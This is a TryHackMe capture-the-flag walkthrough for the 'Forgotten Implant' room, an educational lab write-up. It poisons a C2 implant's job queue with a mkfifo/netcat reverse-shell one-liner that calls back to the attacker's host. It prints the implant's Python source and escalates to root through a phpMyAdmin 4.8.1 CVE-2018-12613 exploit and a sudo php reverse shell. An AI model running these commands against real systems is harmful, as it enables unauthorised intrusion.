<h1 align="center">Forgotten Implant</h1>
<p align="center">2025, September 8<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>490</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>With almost no attack surface, you must use a forgotten C2 implant to get initial access</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/6069cbaa-6fcd-4cdd-81d7-5eaee3b5afe5"><br>
Access this TryHackMe´s challenge <a href="https://tryhackme.com/room/forgottenimplant ">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/2509aebb-aba3-4bfa-ae73-c6098903eb7e"></p>

<h2>Task 1 . Forgotten Implant</h2>
<p>Welcome to Forgotten Implant!<br>

This is a pretty straightforward CTF-like room in which you will have to get initial access before elevating your privileges. The initial attack surface is quite limited, and you'll have to find a way of interacting with the system.<br>

If you have no prior knowledge of Command and Control (C2), you might want to look at the Intro to C2 room. While it is not necessary to solve this challenge, it will provide valuable context for your learning experience.<br>

Please allow 3-5 minutes for the VM to boot properly!<br>

Note: While being very linear, this room can be solved in various ways. To get the most out of it, feel free to overengineer your solution to your liking!</p>

<p><em>Answer tbe questions below</em></p>

<br>
<h2>nmap</h2>

```bash
:~/ForgottenImplant#nmap -sT -p- xx.xxx.xx.xx
...
PORT   STATE SERVICE
22/tcp open  ssh
```

<img width="919" height="261" alt="image" src="https://github.com/user-attachments/assets/9ab37d0f-2c18-4519-bc31-c9e13fb98eac" />


<br>
<br>
<h2>nc</h2>

```bash
:~/ForgottenImplant# nc -nlvp 81
Listening on 0.0.0.0 81
```

<h2>tcpdump</h2>

```bash
:~/ForgottenImplant# tcpdump -i ens5
Listening on 0.0.0.0 81
```

<h2>nc</h2>

```bash
:~/ForgottenImplant# nc -nlvp 81
Listening on 0.0.0.0 81
Connection received on xx.xxx.xx.xx 40300
GET
DktMDlUMDE6Mjc6MDIuMDEzODMzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03Mi0xMTYifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9
/heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1
Host: xx.xxx.xx.xxx:81
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

<img width="1253" height="282" alt="image" src="https://github.com/user-attachments/assets/94b1a7ae-9524-4d8c-8f6c-92e6f03d253e" />

<br>
<br>

```bash
:~/ForgottenImplant# python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMDktMDlUMDE6NDE6MDIuMDc0ODI5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03Mi0xMTYifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 
```

<img width="1355" height="292" alt="image" src="https://github.com/user-attachments/assets/4e1170fc-3d69-45a7-8ec0-24eeceea67aa" />

<br>
<br>
<h2>CyberChef</h2>

```bash
{"time": "2025-09-08Txx:xx:xx.xxxxxx9", "systeminfo": {"os": "Linux", "hostname": "ip-xx-xxx-xx-xxx6"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
```

<img width="1354" height="266" alt="image" src="https://github.com/user-attachments/assets/9f0df0b1-7eed-41c1-88f0-8b5b6b8b5efe" />

<br>
<br>

```bash
"latest"
```

<img width="1359" height="170" alt="image" src="https://github.com/user-attachments/assets/23bbf18b-f500-47d3-8a39-da717b1eb078" />

<br>
<br>

<h2>get-job</h2>

```bash
:~/ForgottenImplant# mkdir get-job
```

```bash
:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
```

<img width="1357" height="189" alt="image" src="https://github.com/user-attachments/assets/686026c4-9eb0-4321-a496-5dcbb09f6fab" />

<br>
<br>
<br>


```bash
:~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx 1234 >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
```

```bash
:~/ForgottenImplant# python3 -m http.server 81
...
xx.xxx.xx.xxx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
```

<br>
<h2>ada</h2>

```bash
:~/ForgottenImplant# nc -nlvp 1234
...
ada@...:~$ 
```

```bash
ada@...:~$  python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
```

```bash
ada@...:~$ pwd
pwd
/home/ada
```

```bash
ada@...:~$ id
id
uid=1001(ada) gid=1001(ada) groups=1001(ada)
```

```bash
ada...:~$ ll
ll
total 44
drwxr-xr-x 5 ada  ada  4096 Mar 13  2023 ./
drwxr-xr-x 6 root root 4096 Sep  8 xx:xx ../
lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ada  ada   220 Jul 10  2022 .bash_logout
-rw-r--r-- 1 ada  ada  3771 Jul 10  2022 .bashrc
drwx------ 3 ada  ada  4096 Jul 12  2022 .cache/
drwxrwxr-x 2 ada  ada  4096 Sep  9 01:20 .implant/
drwxrwxr-x 4 ada  ada  4096 Jul 12  2022 .local/
-rw-rw-r-- 1 ada  ada   292 Jul 12  2022 products.py
-rw-r--r-- 1 ada  ada   807 Jul 10  2022 .profile
lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .python_history -> /dev/null
-rw-rw-r-- 1 ada  ada    66 Jul 11  2022 .selected_editor
-rw-rw-r-- 1 ada  ada    38 Jul 12  2022 user.txt
```

```bash
ada@...:~$ cat user.txt
cat user.txt
THM{********************************}
```

<br>
<p>1.1. What is the user flag?<br>
<code>THM{********************************}</code></p>
<br>
<br>


```bash
ada@...:~$ find / -perm -4000 -user root -type f 2>/dev/null
find / -perm -4000 -user root -type f 2>/dev/null
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/passwd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```

<h2>pspy</h2>
<p>

- /usr/sbin/CRON -f<br>
- /bin/sh -c python3 /home/ada/.implant/implant.p<br>
- /python3 /home/ada/.implant/implant.py<br>
- /usr/sbin/CRON -f

</p>

```bash
ada@...:/tmp$ wget http://xx.xxx.x.xxx:8000/pspy64 -O /tmp/pspy64;chmod +x /tmp/pspy64;/tmp/pspy64
```

<img width="1356" height="792" alt="image" src="https://github.com/user-attachments/assets/eabf20cd-5f9b-4c52-9248-39170318dc94" />

<br>

<img width="1360" height="450" alt="image" src="https://github.com/user-attachments/assets/09bb04e1-3954-4ef8-8ce1-2cd647c015a0" />

<br>
<br>
<h4>./implant</h4>

```bash
ada@...:~$ cd .implant/
cd .implant/
ada@...:~/.implant$ ll 
ll
total 28
drwxrwxr-x 2 ada  ada  4096 Sep  8 xx:xx ./
drwxr-xr-x 5 ada  ada  4096 Mar 13  2023 ../
-rw-rw-r-- 1 ada  ada  9872 Sep  8 xx:xx xx.xxx.x.xxx.log
-rw-r--r-- 1 root root   12 Sep  8 xx:xx hosts
-rw-rw-r-- 1 ada  ada  3783 Mar 13  2023 implant.py
```

<h4>hosts</h4>
<p>

- 127.0.0.1 and xx.xxx.x.xx = forgottenimplant</p>

```bash
ada@...:~/.implant$ cat hosts
cat hosts
xx.xxx.x.xx
```

```bash
ada@...:~$ getent hosts
getent hosts
127.0.0.1       localhost
127.0.1.1       forgottenimplant
127.0.0.1       ip6-localhost ip6-loopback
```

<h4>127.0.0.1 80</h4>

<p>

- 22<br>
- 80<br>
- 3306<br>
- 33060</p>

```bash
ada@...:~$ ss -tulpn
ss -tulpn
Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
udp   UNCONN 0      0      xx.xxx.xx.xxx%ens5:68           0.0.0.0:*            
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0      511             127.0.0.1:80           0.0.0.0:*            
tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN 0      128                  [::]:22              [::]:*          
```

<h4>nmap</h4>

```bash
ada@...:/tmp$ wget http://xx.xxx.xx.xxx:8000/nmap-x64.tar.gz -o nmap
```

```bash
ada@...:/tmp$ tar -xzf nmap-x64.tar.gz
```

<p>

- 22 : ssh<br>
- 80 : http<br>
- 3306 : mysql<br>
- 33060 : mysqlx</p>

```bash
ada@...:/tmp$ ./nmap -sT -p- 127.0.0.1
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
33060/tcp open  mysqlx
```

<h4>implant.py</h4>

```bash
ada@...:~/.implant$ cat implant.py
cat implant.py
import base64
import binascii
import json
import platform
import subprocess
import time
from datetime import datetime
from pathlib import Path

import requests


def systeminfo():
    return {
        'os': platform.system(),
        'hostname': platform.node(),
    }


class Commander:
    def __init__(self, host, log_dir, port=81):
        self.log_dir = Path(log_dir)
        self.log_file = self.log_dir / f'{host}.log'
        self.port = port
        self.host = host

        try:
            self.log = json.loads(self.log_file.read_text())
        except FileNotFoundError:
            self.log = {'heartbeats': [], 'jobs': [{'job_id': 0, 'cmd': 'whoami'}]}
            self.save_log()

    def encode_message(self, message):
        return base64.b64encode(message.encode('utf-8')).decode('utf-8')

    def decode_message(self, message):
        return base64.b64decode(message).decode('utf-8')
    
    def save_log(self):
        self.log_file.write_text(json.dumps(self.log))

    def send_c2_message(self, endpoint, message):
        try:
            message = self.encode_message(json.dumps(message))
            r = requests.get(f'http://{self.host}:{self.port}/{endpoint}/{message}')

            return r.text
        except requests.exceptions.ConnectionError:
            raise ConnectionError('Could not connect to C2')

    def send_heartbeat(self):
        heartbeat = {
            'time': datetime.now().isoformat(),
            'systeminfo': systeminfo(),
            'latest_job': self.log['jobs'][-1] if len(self.log['jobs']) > 0 else None,
            'success': False
        }

        try:
            self.send_c2_message('heartbeat', heartbeat)

            heartbeat['success'] = True
            self.log['heartbeats'].append(heartbeat)
        except ConnectionError:
            self.log['heartbeats'].append(heartbeat)
            print('Could not send heartbeat')

    def execute_cmd(self, command):
        try:
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
            output, err = p.communicate()
            return output.decode('utf-8')
        except Exception as e:
            print(e)
            return False

    def get_job(self, job_id='latest'):
        try:
            job = self.send_c2_message('get-job', job_id)
            job = json.loads(self.decode_message(job))
            self.log['jobs'].append(job)

            if 'cmd' in job:
                job['success'] = True
                job['result'] = self.execute_cmd(job['cmd'])
                self.send_c2_message('job-result', job)
            else:
                job['success'] = False
                job['result'] = 'No command'
                self.send_c2_message('job-result', job)
        except ConnectionError:
            print('Could not get job')
        except TypeError:
            print('Job formatting error')
        except json.JSONDecodeError:
            job = {'success': False, 'result': 'JSON error'}
            self.send_c2_message('job-result', job)
            print('JSON error')    
        except binascii.Error:
            job = {'success': False, 'result': 'Encoding error'}
            self.send_c2_message('job-result', job)
            print('Encoding error')
        except Exception as e:
            print(f'Job execution error ({e})')


if __name__ == "__main__":
    log_dir = Path('/home/ada/.implant')
    hosts_file = Path('/home/ada/.implant/hosts')

    if hosts_file.exists():
        hosts = hosts_file.read_text().split('\n')

        commanders = [Commander(host, log_dir) for host in hosts if host != '']

        for commander in commanders:
            commander.send_heartbeat()
            time.sleep(1)
            commander.get_job()
            commander.save_log()
```

<h4>products.py</h4>
<p>

- host = localhost<br>
- database = app<br>
- user = app<br>
- password = ********</p>

```bash
ada@...:~$ cat products.py
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='********'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')
```

<h4>mysql</h4>

<p>

- database = app<br>
- user = app</p>


```bash
ada@...:/home$ mysql -h localhost -u app -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.42-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| app                |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql> use app;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------+
| Tables_in_app |
+---------------+
| products      |
+---------------+
1 row in set (0.00 sec)

mysql> select * from products;
+----+-------------+-------+
| id | product     | stock |
+----+-------------+-------+
|  1 | Black Shirt |     4 |
|  2 | Grey Scarf  |    12 |
|  3 | Pink Hat    |     2 |
+----+-------------+-------+
3  rows in set (0.00 sec)

mysql> exit
Bye
```

<p>
    
- Title: phpMyAdmin<br>
- phpmyadmin.css.php<br>
- http://www.phpmyadmin.net</p>

```bash
ada@...:~$ curl http://localhost:80/
<!DOCTYPE HTML>... href="phpmyadmin.css.php?nocache=4712093054ltr&amp;server=1" /><link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.8.1" media="print" id="printcss"/><title>phpMyAdmin</title><script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.min.js?v=4.8.1"></script>
...resizer.js");AJAX.fireOnload("rte.js");AJAX.fireOnload("vendor/tracekit.js");AJAX.fireOnload("error_report.js");AJAX.fireOnload("config.js");AJAX.fireOnload("doclinks.js");AJAX.fireOnload("functions.js");AJAX.fireOnload("navigation.js");AJAX.fireOnload("indexes.js");AJAX.fireOnload("common.js");AJAX.fireOnload("page_settings.js");AJAX.fireOnload("shortcuts_handler.js");AJAX.fireOnload("console.js");});
// ]]></script><noscript><style>html{display:block}</style></noscript></head><body id='loginform'><div id="page_content"><div class="container">
<a href="./url.php?url=https%3A%2F%2Fwww.phpmyadmin.net%2F" target="_blank" rel="noopener noreferrer" class="logo">
```    
    
    
```bash
<noscript>
<div class="error"><img src="themes/dot.gif" title="" alt="" class="icon ic_s_error" /> Javascript must be enabled past this point!</div>
</noscript>

<div class="hide" id="js-https-mismatch">
<div class="error"><img src="themes/dot.gif" title="" alt="" class="icon ic_s_error" /> There is mismatch between HTTPS indicated on the server and client. This can lead to non working phpMyAdmin or a security risk. Please fix your server configuration to indicate HTTPS properly.</div>
</div>

    <br />
    <!-- Login form -->
    <form method="post" id="login_form" action="index.php" name="login_form" class="disableAjax login hide js-show">
        <fieldset>
        <legend><input type="hidden" name="set_session" value="vp68fj0cb2i9b2v8jtnskeh55e" />Log in<a href="./url.php?url=https%3A%2F%2Fdocs.phpmyadmin.net%2Fen%2Flatest%2Findex.html" target="documentation"><img src="themes/dot.gif" title="Documentation" alt="Documentation" class="icon ic_b_help" /></a></legend><div class="item">
                <label for="input_username">Username:</label>
                <input type="text" name="pma_username" id="input_username" value="" size="24" class="textfield"/>
            </div>
            <div class="item">
                <label for="input_password">Password:</label>
                <input type="password" name="pma_password" id="input_password" value="" size="24" class="textfield" />
            </div>    <input type="hidden" name="server" value="1" /></fieldset><fieldset class="tblFooters"><input value="Go" type="submit" id="input_go" /><input type="hidden" name="target" value="index.php" /><input type="hidden" name="lang" value="en" /><input type="hidden" name="token" value=";)pB/Sc^o8D}pw%?" /></fieldset>
    </form></div>
```

<h4>/var/www/phpmyadmin</h4>

```bash
ada@...:/var/www/phpmyadmin$ ls
ajax.php                  robots.txt
browse_foreigners.php     schema_export.php
ChangeLog                 scripts
changelog.php             server_binlog.php
```

<h4>/var/www/phpmyadmin/scripts</h4>

```bash
ada@...:/var/www/phpmyadmin/scripts$ ls
advisor2po            phpunit-top-tests
create-release.sh     remove-incomplete-mo
fix-po-twig           transformations_generator_main_class.sh
generate-mo           transformations_generator_plugin.sh
generate-twig-cache   update-po
lang-cleanup.sh       upload-release
locales-contributors
```

<h4>README</h4>
<p>

- phpmyadmin 4.8.1</p>

```bash
ada@...:/var/www/phpmyadmin$ cat README | head
cat README | head
phpMyAdmin - Readme
===================

Version 4.8.1

A web interface for MySQL and MariaDB.

https://www.phpmyadmin.net/

Summary
```

<br>
<br>
<h2>CVE-2018-12613</h2>

```bash
:~/ForgottenImplant# searchsploit phpmyadmin 4.8.1
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE | php/webapps/50457.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
``` 

```bash
:~/ForgottenImplant#searchsploit -m php/webapps/50457.py
  Exploit: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50457
     Path: /opt/exploitdb/exploits/php/webapps/50457.py
    Codes: CVE-2018-12613
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/50457.py
```

```bash
:~/ForgottenImplant# python3 50457.py
Usage: 50457.py [ipaddr] [port] [path] [username] [password] [command]
Example: 50457.py xxx.xxx.xx.xx 8080 /phpmyadmin username password whoami
``` 

<br>
<br>

```bash
ada@...:~$ wget http://xx.xxx.x.xx:8000/50457.py
```

```bash
ada@...:~$ python3 50457.py 127.0.0.1 80 / app ******** 'whoami'
<thon3 50457.py 127.0.0.1 80 / app ******** 'whoami'
www-data
```

```bash
ada@...:~$ python3 50457.py 127.0.0.1 80 / app ******** 'sudo -l'
<hon3 50457.py 127.0.0.1 80 / app ******** 'sudo -l'
Matching Defaults entries for www-data on ip-xx-xxx-xx-xxx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-xx-xxx-xx-xxx:
    (root) NOPASSWD: /usr/bin/php
```

```bash
ada@i...:~$ wget http://xx.xxx.x.xx:8000/rev.php
```

```bash
ada@i...:~$ python3 50457.py 127.0.0.1 80 / app ******** 'sudo /usr/bin/php /home/ada/rev.php'
< app ******** 'sudo /usr/bin/php /home/ada/rev.php'
```


<br>
<br>

```bash
:~/ForgottenImplant# nc -nlvp 9001
...
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
root@...:/# pwd
pwd
/
root@...:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@i...:/# ls /root
ls /root
snap
```

```bash
root@...:/# cd /root
cd /root
```

```bash
root@...:~# ls -lah
ls -lah
total 48K
drwx------  7 root root 4.0K Jun  7 15:43 .
drwxr-xr-x 18 root root 4.0K Sep  9 xx:xx ..
lrwxrwxrwx  1 root root    9 Mar 13  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
drwx------  2 root root 4.0K Jun  7 15:40 .cache
drwxr-xr-x  3 root root 4.0K Jul 12  2022 .composer
drwxr-xr-x  3 root root 4.0K Jul 11  2022 .local
-rw-------  1 root root  800 Jul 12  2022 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
lrwxrwxrwx  1 root root    9 Mar 13  2023 .python_history -> /dev/null
-rw-r--r--  1 root root   38 Jul 12  2022 .root.txt
-rw-r--r--  1 root root   66 Jul 12  2022 .selected_editor
drwx------  2 root root 4.0K Jul 10  2022 .ssh
-rw-------  1 root root    0 Jun  7 15:43 .viminfo
drwx------  3 root root 4.0K Jul 10  2022 snap
```

```bash
root@i...:~# cat .root.txt
cat .root.txt
THM{********************************}
```

<br>
<p>1.2. What is the root flag?<br>
<code>THM{********************************}</code></p>
<br>

<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/c618ba83-9209-4557-96c4-6f484b743551"><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/c33a1127-77bc-422c-ba14-1005294bbbbd"></p>

<h2 align="center">My TryHackMe Journey</h2>


<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
| 2025, Sep 9       |Easy 🔗 - <code><strong>Forgotten Implant</strong></code>| 491| 112ⁿᵈ | 5ᵗʰ   |    660ᵗʰ    |     10ᵗʰ    | 125,016  |  953      |    73     |
| 2025, Sep 8       |Easy 🔗 - Web Enumeration| 490| 112ⁿᵈ | 5ᵗʰ   |    663ʳᵈ    |     10ᵗʰ    | 124,986  |  952      |    73     |
| 2025, Sep 8       |Easy 🔗 - iOS: Forensics| 490| 113ʳᵈ | 5ᵗʰ   |    548ᵗʰ    |     9ᵗʰ    | 124,850  |  951      |    73     |
| 2025, Sep 7       |Medium 🚩 - VulnNet: Active| 489| 114ᵗʰ | 5ᵗʰ   |    542ⁿᵈ    |     9ᵗʰ    | 124,746  |  950      |    73     |
| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489|     114ᵗʰ |     5ᵗʰ      |    535ᵗʰ   |     9ᵗʰ    | 124,716  |  949      |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489     |     113ʳᵈ    |     5ᵗʰ      |    508ᵗʰ   |     9ᵗʰ    | 124,886  |  948      |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488     |     114ᵗʰ    |      5ᵗʰ     |     683ᵗʰ   |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ   |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ   |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488     |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487     |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487     |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486     |	   113ʳᵈ   |	     5ᵗʰ   	|      579ᵗʰ   |	  10ᵗʰ    |	124,018  |	  940	   |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486     |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   112ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/5616ee8a-a4ff-4fa3-95de-24e289ca7cc7"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/c70ebd82-a133-48a2-9d06-3722a7c53fa8"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/9678529c-813e-48f1-8107-145fe5e45361"><br>
                  Global monthly:    660ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/0679c587-e95e-4027-9a39-3ecb9f7174e5"><br>
                  Brazil monthly:      10ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/68f96f70-5979-44e7-aa01-79daa732c507"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>  
